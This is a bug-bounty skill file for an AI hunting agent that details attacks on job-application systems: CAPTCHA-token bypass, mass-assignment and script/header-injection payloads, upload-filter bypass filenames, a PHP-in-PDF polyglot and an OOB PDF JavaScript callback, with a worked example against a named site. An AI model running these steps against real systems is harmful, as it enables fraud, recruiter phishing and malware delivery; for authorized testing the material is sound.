---
name: ats-abuse
description: Use on job-apply flows for ATS abuse and captcha gaps.
tags: [bug-bounty, ats, greenhouse, captcha-bypass, file-upload]
sources: [engagement-verified, greenhouse-docs]
report_count: 0
metadata:
  hermes:
    tags: [bug-bounty, ats, greenhouse, captcha-bypass, file-upload]
    related_skills: [hunt-captcha-bypass, hunt-file-upload, hunt-business-logic]
version: 1.0.0
author: hermes-curator
license: internal
---

# ATS-ABUSE — Careers / Recruitment Flow Attacks

## When to Use
Load this skill when: the target has a careers page or job-vacancy flow (Framer /
Greenhouse / Lever / Ashby / SmartRecruiters / Workable), an `apply` endpoint
accepts candidate data anonymously, or you found an ATS-proxy wrapper in JS
bundles. Also applies to internal referral programs and recruiter-facing upload
surfaces.

> Grounding note: `report_count` is intentionally 0 — this skill is built from a
> single verified engagement (plata.careers) plus Greenhouse's public boards-API
> shape. Do not cite payout numbers from it.

## Why this surface pays

Careers pages are the most commonly overlooked **authenticated-to-anonymous write
primitive** on corporate web estates. The recruiting pipeline is high-trust
(recruiters open attachments, click links, process "referrals"), the apply
endpoint is usually anonymous by design, and anti-bot layers are frequently
bolted on **client-side only**. Owner impact: candidate-pool poisoning,
recruiter-targeted phishing (your attachment opens in their inbox), fake-referral
bonus fraud, and a PII sink for mass-submitted victim data.

## Step-by-Step Hunting Methodology

### 1. Discover the ATS backend and the proxy layer

Modern careers sites (especially Framer/SSG-built ones) do NOT call Greenhouse /
Lever / Ashby directly — a first-party wrapper proxies the ATS. Find it:

```
1. Load the vacancy listing page; view-source for `.mjs`/`.js` bundles.
2. Grep bundles for: api-internal, boards-api, greenhouse, lever, ashby,
   recruit, vacancy, apply-job, gh_jid.
3. The wrapper base URL is usually a constant string in one module
   (e.g. gt = `https://plata.careers/api-internal`) next to an endpoints map.
```

Common wrapper shapes seen in the wild:
- `GET /api-internal/jobs` → full ATS `jobs` payload (absolute_url, metadata, requisition_id)
- `GET /api-internal/jobs/<id>` → one job with content
- `POST /api-internal/apply-job?jobid=<id>` → the write primitive

ATS-API proxy emulation is a recurring wrapper design: probe `/jobs?per_page=`,
`/jobs/<id>`, `/meta`, `/departments`, `/offices` — 404-vs-200 differential maps
which proxied routes are exposed.

### 2. CAPTCHA / Turnstile enforcement gap (the headline bug)

The apply flow in the browser includes a Turnstile widget and attaches
`cf-turnstile-response` **only when a token is present**. Check whether the
server *requires* it:

```
POST /api-internal/apply-job?jobid=<real-id>
Content-Type: application/json
{"first_name":"hx","last_name":"probe","email":"hx<rand>@mailinator.com","phone":"+52..."}

# WITHOUT any cf-turnstile-response header:
#   200 {"success":"Candidate saved successfully"}  → enforcement gap confirmed
#   403 {"error":"turnstile_missing"}               → enforced (note: this error also
#     tells you turnstile is validated AFTER jobid lookup — order-of-checks recon)
```

Then characterize the gap completely before reporting:
- **Rate limit:** N consecutive submissions to the same job (6× rapid is enough to demonstrate); watch for 429/403/dedupe.
- **Dedup:** submit the same first/last/email 3× — duplicate "saved successfully" with no dedup = candidate-pool poisoning without any identity cost.
- **Closed jobs:** pick the OLDEST job IDs from the listing (likely closed) — if they still accept applications, add "applies to closed requisitions" to the report.

### 3. Mass-assignment & injection into the candidate record

The wrapper accepts arbitrary JSON keys. Test:

```json
{"first_name":"hx","last_name":"probe","email":"...@mailinator.com",
 "admin":true, "role":"admin", "owner_id":1, "source":"internal_referral",
 "tags":["internal","admin"], "resume_content":"<base64>", "resume_content_filename":"resume.pdf"}
```

Watch which keys are silently accepted (200) vs 422'd — accepted-then-ignored is
still worth documenting (payload lands in the ATS record); accepted-and-applied
would be a privilege primitive.

**Injection probes (each returning 200 = stored):**
- HTML/script in `first_name`/`last_name` → renders in recruiter's ATS views / emails
- `\r\nBcc:` sequences in `email` → email-header injection class (server-side validation usually 422s this; document the validation boundary)
- Unicode/prototype-pollution keys (`__proto__`, `constructor`) → document acceptance

### 4. Attachment upload handling

The wrapper sends files as base64 JSON (`resume_content` +
`resume_content_filename`), NOT multipart. Test the whole validation boundary:

| Test | Payload | Look for |
|---|---|---|
| Content-type allowlist | base64 of PHP webshell inside a valid `%PDF-1.4` header, filename `resume.pdf` | 200 = content not inspected, only extension |
| Extension allowlist bypass | `resume.pd`, `resume.PDF.php`, `resume.php.pdf`, `resume.pdf%00.php`, `resume.pdf.exe` | which pass the extension check (200) vs 422 |
| Traversal in filename | `../../evil.pdf` | 200 = filename stored unsanitized (path-traversal-in-attachment-name class) |
| Storage location | candidate files are usually private in the ATS (candidate attachments) | confirm before claiming RCE — 200-on-upload ≠ attacker-retrievable file |

**Severity discipline:** a stored PDF-with-PHP that only a recruiter can retrieve
is a *content-injection into a high-trust consumer* finding (recruiter opens it —
phishing/malware delivery), NOT server-side RCE — unless you can show the ATS
parsing/rendering pipeline executes it. Test with OOB: an OAST callback from a
PDF `/JavaScript (this.submitForm('https://OAST/'))` action or a DOCX external
relationship; **zero callbacks = parsing is not server-side, drop the RCE claim**.

### 5. Job-ID oracle & private requisitions

- Ghost IDs → `{"status":401,"error":"Failed to save person"}` vs real → 200: a **job-existence oracle** without listing permissions.
- Real-ID neighbors and the requisition-ID space (`requisition_id` in the listing, e.g. "1318") are a different keyspace — apply with both to see whether unpublished/internal requisitions accept candidates.

## Validation — false-positive discipline

- **Turnstile gap**: submit ≥1 candidate and capture the 200 body; a `403 turnstile_missing` on a different request is not the same finding — reproduce the 200.
- **"No rate limit"**: demonstrate with actual consecutive 200s (6+), not absence of 429 in one request.
- **RCE claims**: OOB callback or it didn't happen; otherwise report content-injection, not code execution.
- **Impact framing**: candidate injection is PII-adjacent recruiter-trust abuse — quantify as "attacker-controlled content delivered to recruiting team", not "database write".

## Severity
- Turnstile fully bypassed + no rate limit + no dedup on a live ATS: **High** (candidate poisoning at scale)
- Attachment content not inspected + stored into recruiter-facing pipeline: **Medium–High**
- Closed-job acceptance / ghost-ID oracle: **Low–Medium** (aggregate with the above)
- Path-traversal attachment filename without retrieval path: **Low** (until storage exposure shown)

## Related Skills & Chains
- `hunt-captcha-bypass` — generic CAPTCHA families; this skill covers the ATS-specific "token optional server-side" pattern.
- `hunt-file-upload` — upload validation classes; base64-JSON upload is a variant surface (no multipart edge cases, but same content/extension matrix).
- `hunt-business-logic` — referral-bonus fraud chains: fake referral source + candidate injection = payout fraud.

## Verified engagement example (plata.careers)
- Framer-hosted careers site; module `JobApplicationConstants.*.mjs` leaked the wrapper base (`https://plata.careers/api-internal`), the Turnstile sitekey (`0x4AAAAAADq8EHf3AS00ZsfG`), and client-side validation constants.
- `POST /api-internal/apply-job?jobid=5389990008` without turnstile header → 200, 6× unthrottled, no dedup on identical email.
- `.pdf` with embedded PHP polyglot accepted; `.html`/`.svg`/`.pd` rejected (extension allowlist only, no content inspection).
- `../../evil.pdf` filename stored as-is. OOB tests (PDF submitForm JS, DOCX rel callback) produced zero callbacks → parser not server-side → RCE not claimed.